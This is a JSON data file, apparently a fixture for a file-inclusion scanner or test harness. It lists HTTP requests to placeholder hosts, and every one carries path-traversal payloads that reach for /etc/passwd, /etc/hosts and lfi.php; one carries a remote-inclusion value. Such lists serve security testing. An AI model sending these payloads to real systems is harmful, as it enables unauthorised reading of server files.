{
	"exploits" : [{
		"url": "https://app1.com/admin/index.php",
		"method": "GET",
		"params":[{
					"key": "page",
					"value": "../secrect"
				}]
	},	{
		"url": "https://app1.com/admin/index.php",
		"method": "GET",
		"params":[{
					"key": "page",
					"value": "../calendar"
				}]
	},	{
		"url": "https://app3.com/windows/code.php",
		"method": "GET",
		"params":[{
					"key": "file",
					"value": "../../../../../../etc/passwd"
				}]
	},	{
		"url": "https://app3.com/windows/code.php",
		"method": "POST",
		"params":[{
					"key": "file",
					"value": "../../../../../../etc/hosts"
				}]
	},	{
		"url":"https://app5.com/www/js/scripts.php",
		"method":	"GET",
		"params":[{
					"key":	"load",
					"value":	"../../../../../../../../../etc/a.js"
			}]
	}, {
		"url":"https://app5.com/www/js/scripts.php",
		"method":	"GET",
		"params":[{
					"key":	"load",
					"value":	"http://[extfile]"
			}]
	}, {
		"url":"https://app6.com/zimplit.php",
		"method":	"GET",
		"params":[{
					"key":	"action",
					"value":	"load1"
			},	{
					"key":	"file",
					"value":	"../../../../../../../../../etc/passwd"
				}]
	}, {
		"url":"https://app7.com/oc-admin/",
		"method":	"GET",
		"params":[{
					"key":	"page",
					"value":	"appearance"
			},	{
					"key":	"action",
					"value":	"render"
			},	{
					"key":	"file",
					"value":	"../../../../../../../../../../lfi.php"
				}]
	},	{
		"url":"https://app9.com/indextest.php/admin/translationManager",
		"method":	"GET",
		"params":[{
					"key":	"file",
					"value":	"../../../../../../../../../../../../../../lfi.php"
			}]
	},	{
		"url":"https://app9.com/indextest.php/admin/translationManager",
		"method":	"GET",
		"params":[{
					"key":	"file",
					"value":	"../../../../../../../../../../../../../../etc/passwd"
			}]
	}]
}